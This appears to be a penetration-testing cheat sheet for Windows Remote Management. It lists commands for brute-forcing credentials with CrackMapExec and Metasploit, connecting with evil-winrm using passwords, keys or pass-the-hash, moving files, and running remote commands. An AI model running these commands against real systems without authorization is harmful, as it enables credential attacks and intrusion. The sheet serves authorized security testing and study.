## Enumeration

### Brute Force Credentials

```sh
# CrackMapExec
poetry run crackmapexec winrm <target-ip> -d DomainName -u usernames.txt -p passwords.txt

# Metasploit
msfconsole
msf > use auxiliary/scanner/winrm/winrm_login
```

<br />

## Evil-WinRM

**[Evil-WinRM](https://github.com/Hackplayers/evil-winrm)** is a Windows Remote Management shell for pentesting.  
Below are list of commands for each situation.

### Connect

```powershell
evil-winrm -i <target-ip> -u username -p password
# -P: Specifify port
evil-winrm -i <target-ip> -P 5986 -u username -p password

# Pass The Hash (-H)
evil-winrm -i <target-ip> -P 5986 -u username -H 0e0363213e37b94221497260b0bcb4fc

# PowerShell Local Path (-s)
evil-winrm -i <target-ip> -u username -p password -s /opt/scripts

# SSL enabled (-S)
evil-winrm -i <target-ip> -u username -p password -S
```

If you have private key and public key, you can use them for authentication.

```sh
# -S: SSL
# -k: private key
# -c: public key
evil-winrm -i <target-ip> -S -k private.key -c public.key
```

### Commands

After connecting, we can use a lot of useful commands to exploit.  
Note that **we need to specify the absolute path for uploading and downloading.**

```powershell
# Upload a local file to Windows machine
PS> upload ./example.bat c:\\Users\Administrator\Desktop\exploit.bat
# Download a file to local
PS> download c:\\Users\Administrator\Desktop\example.txt ./example.txt

# List all services
PS> services
```

## CrackMapExec

**[CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec)** is a swiss army knife for pentesting networks.  
The official docs says that it's recommended to use it via **Poetry** which is a Python package manager.  

First off, move to the directory in which the CrackMapExec installed and run **poetry install**.

```sh
cd crackmapexec
poetry install
```

Then execute with **poetry run**.

```sh
# Login and CMD execution (-x)
poetry run crackmapexec winrm <target-ip> -d DomainName -u username -p password -x 'whoami'
# Login and PowerShell execution (-X)
poetry run crackmapexec winrm <target-ip> -d DomainName -u username -p password -X '$PSVersionTable'

# Pass the Hash and CMD execution (-x)
poetry run crackmapexec winrm <target-ip> -d DomainName -u username -H <HASH> -x 'whoami'
# Pass the Hash and PowerShell execution (-X)
poetry run crackmapexec winrm <target-ip> -d DomainName -u username -H <HASH> -X '$PSVersionTable'
```
